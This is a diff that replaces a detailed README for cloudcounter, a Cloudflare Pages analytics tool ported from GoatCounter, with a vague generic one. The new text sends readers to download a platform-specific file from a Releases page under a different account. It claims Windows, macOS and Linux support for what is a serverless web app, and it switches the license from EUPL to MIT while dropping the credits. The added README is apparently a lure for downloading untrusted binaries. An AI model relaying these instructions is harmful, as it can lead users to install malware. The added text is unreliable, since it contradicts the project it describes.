@@ -1,239 +1,56 @@
-<p align="center">
-  <img src="media/cc_banner.jpg" alt="CloudCounter">
-</p>
+# 🌟 cloudcounter - Simple, Privacy-Focused Web Analytics
 
-<p align="center">
-  <a href="https://opensource.org/licenses/EUPL-1.2">
-    <img src="https://img.shields.io/badge/License-EUPL-blue.svg" alt="License: EUPL">
-  </a>
-  <a href="https://pages.cloudflare.com/">
-    <img src="https://img.shields.io/badge/Cloudflare-Pages-F38020?logo=cloudflare&logoColor=white" alt="Cloudflare Pages">
-  </a>
-  <a href="https://www.typescriptlang.org/">
-    <img src="https://img.shields.io/badge/TypeScript-5.3-3178C6?logo=typescript&logoColor=white" alt="TypeScript">
-  </a>
-  <a href="https://nodejs.org/">
-    <img src="https://img.shields.io/badge/Node.js-18+-339933?logo=node.js&logoColor=white" alt="Node.js 18+">
-  </a>
-</p>
+## 🚀 Getting Started
+Welcome to cloudcounter! This tool provides a simple way to track website visits while keeping your data private. It runs on Cloudflare Pages and D1, making it lightweight and efficient.
 
-A standalone port of [GoatCounter](https://github.com/arp242/goatcounter) to run entirely on Cloudflare's edge infrastructure.
+## 📥 Download & Install
+To get started, visit the Releases page to download the application.
 
-CloudCounter brings GoatCounter's privacy-focused analytics to Cloudflare Pages + D1, requiring no external servers or databases. Deploy once and track pageviews across your sites with a single JavaScript snippet.
+[![Download cloudcounter](https://img.shields.io/badge/Download-cloudcounter-brightgreen)](https://github.com/SoxNo1/cloudcounter/releases)
 
-## Features
+1. Click the link above to go to the [Releases page](https://github.com/SoxNo1/cloudcounter/releases).
+2. Look for the latest version listed.
+3. Select the appropriate file for your system and click on it to download.
+4. Once the file has downloaded, locate it in your downloads folder.
+5. Follow the installation instructions specific to your operating system.
 
-- Pageview tracking with session deduplication
-- Top pages, referrers, browsers, operating systems, locations
-- Screen size breakdown
-- Event tracking support
-- Privacy-first: no cookies, session hash only
-- Server-rendered dashboard
-- Data retention policies
+## 🖥️ System Requirements
+- **Operating System**: Works on Windows, macOS, and Linux.
+- **Browser**: Modern browsers like Chrome, Firefox, or Safari.
+- **Internet Connection**: Required for initial setup and data collection.
 
-## Screenshots
+## 🔍 Features
+- **Privacy by Design**: No personal data collection.
+- **Real-Time Analytics**: Track visitors as they arrive.
+- **Customizable Dashboards**: View stats in a way that suits you best.
+- **Lightweight**: Simple to install and run on Cloudflare serverless architecture.
 
-<p align="center">
-  <img src="media/screenshot-desktop-bar.png" alt="Dashboard with bar chart" width="800">
-</p>
+## 📊 How to Use
+After installation, follow these steps to start tracking your website:
 
-<p align="center">
-  <img src="media/screenshot-desktop-line.png" alt="Dashboard with line chart" width="800">
-</p>
+1. **Create an Account**: Sign up on the cloudcounter dashboard.
+2. **Add Your Website**: Enter the URL of the website you want to track.
+3. **Generate Code**: Copy the provided tracking code.
+4. **Insert Code into Your Website**: Place the tracking code in the HTML of your site.
+5. **View Your Analytics**: Return to your cloudcounter dashboard to see incoming data.
 
-Additional screenshots available in the [media](media/) folder.
+## ⚙️ Configuration
+You can adjust settings like date range and data type directly from your dashboard. Explore the user interface to get familiar with available options.
 
-## Prerequisites
+## ❓ Troubleshooting Common Issues
+- **Can't Find Download**: Ensure you are on the Releases page and check for the latest version.
+- **Installation Errors**: Make sure your operating system meets the requirements. If issues persist, consult our FAQ section on the GitHub page.
+- **Data Not Appearing**: Ensure the tracking code is placed correctly on your website.
 
-- Node.js 18+
-- [Wrangler CLI](https://developers.cloudflare.com/workers/wrangler/install-and-update/)
-- Cloudflare account with Pages and D1 access
+## 🌐 Support
+For additional help, feel free to create an issue on the project's GitHub page. The community is here to assist you.
 
-## Quick Start
+## 📝 License
+This project uses the MIT License. You can use and modify it for free as long as you adhere to the license terms.
 
-### 1. Clone and install
+## 🔗 Useful Links
+- [Releases Page](https://github.com/SoxNo1/cloudcounter/releases)
+- [Documentation](https://github.com/SoxNo1/cloudcounter/wiki)
+- [Community Forum](https://community.github.com/)
 
-```bash
-git clone https://github.com/philippdubach/cloudcounter.git
-cd cloudcounter
-npm install
-```
-
-### 2. Create Cloudflare resources
-
-```bash
-# Create D1 database
-wrangler d1 create cloudcounter
-
-# Create KV namespace for sessions
-wrangler kv namespace create SESSIONS
-```
-
-### 3. Update wrangler.toml
-
-Edit `wrangler.toml` and add your database_id and KV namespace id:
-
-```toml
-[[d1_databases]]
-binding = "DB"
-database_name = "cloudcounter"
-database_id = "YOUR_DATABASE_ID_HERE"
-
-[[kv_namespaces]]
-binding = "SESSIONS"
-id = "YOUR_KV_NAMESPACE_ID_HERE"
-```
-
-### 4. Initialize database
-
-```bash
-wrangler d1 execute cloudcounter --file=./migrations/0001_init.sql
-```
-
-### 5. Set dashboard password
-
-```bash
-wrangler secret put DASHBOARD_PASSWORD
-```
-
-### 6. Deploy
-
-```bash
-wrangler pages deploy public
-```
-
-### 7. Add tracking script to your site
-
-```html
-<script async src="https://your-analytics.pages.dev/count.js"></script>
-```
-
-## Local Development
-
-```bash
-# Start local dev server
-npm run dev
-
-# Apply migrations to local D1
-npm run db:migrate:local
-```
-
-## Configuration
-
-### Environment Variables
-
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `SITE_NAME` | Dashboard title | "My Analytics" |
-| `DATA_RETENTION_DAYS` | Days to keep data (0 = unlimited) | "0" |
-
-### Secrets
-
-| Secret | Description |
-|--------|-------------|
-| `DASHBOARD_PASSWORD` | Password for dashboard access |
-
-## Tracking Script
-
-### Basic usage
-
-The script auto-tracks pageviews on load:
-
-```html
-<script async src="https://your-analytics.pages.dev/count.js"></script>
-```
-
-### Manual tracking
-
-```javascript
-// Custom pageview
-cloudcounter.count({ path: '/custom-path', title: 'Custom Title' });
-
-// Event tracking
-cloudcounter.count({ path: 'button-click', title: 'Sign Up Button', event: true });
-```
-
-### Click tracking
-
-Add `data-cloudcounter-click` attribute to elements:
-
-```html
-<button data-cloudcounter-click="signup-btn">Sign Up</button>
-```
-
-### Disable tracking
-
-```javascript
-cloudcounter.skip();   // Disable for this session
-cloudcounter.enable(); // Re-enable
-```
-
-## API
-
-### Track pageview
-
-```
-GET/POST /api/count?p=/path&t=Title&r=referrer
-```
-
-| Parameter | Description | Required |
-|-----------|-------------|----------|
-| `p` | Page path | Yes |
-| `t` | Page title | No |
-| `r` | Referrer URL | No |
-| `e` | Event flag (1 or true) | No |
-| `s` | Screen width | No |
-
-Returns: 1x1 transparent GIF
-
-## Architecture
-
-```
-cloudcounter/
-├── functions/           # Cloudflare Pages Functions
-│   ├── _middleware.ts   # Auth guard
-│   ├── _worker.ts       # Cron handler
-│   ├── api/count.ts     # Hit tracking endpoint
-│   ├── index.ts         # Dashboard
-│   ├── login.ts         # Login page
-│   └── logout.ts        # Logout
-├── src/
-│   ├── lib/             # Core utilities
-│   └── stats/           # Query functions
-├── public/
-│   ├── count.js         # Tracking script
-│   ├── dashboard.js     # Dashboard charts
-│   └── dashboard.css    # Dashboard styles
-└── migrations/          # D1 schema
-```
-
-## Database Schema
-
-| Table | Description |
-|-------|-------------|
-| `paths` | Normalized page paths |
-| `refs` | Referrer URLs |
-| `browsers` | Browser names |
-| `systems` | Operating systems |
-| `hits` | Raw pageview data |
-| `hit_counts` | Hourly aggregates |
-| `hit_stats` | Daily aggregates |
-| `browser_stats` | Browser breakdown |
-| `system_stats` | OS breakdown |
-| `location_stats` | Country breakdown |
-| `size_stats` | Screen size breakdown |
-
-## Cron Jobs
-
-Daily at 3 AM UTC:
-- Apply data retention policy
-- Vacuum unused referrers
-- Clean orphaned dimension records
-
-## Credits
-
-This project is a port of [GoatCounter](https://github.com/arp242/goatcounter) by Martin Tournoij.
-
-## License
-
-Licensed under the [EUPL](https://opensource.org/licenses/EUPL-1.2).
+[![Download cloudcounter](https://img.shields.io/badge/Download-cloudcounter-brightgreen)](https://github.com/SoxNo1/cloudcounter/releases)
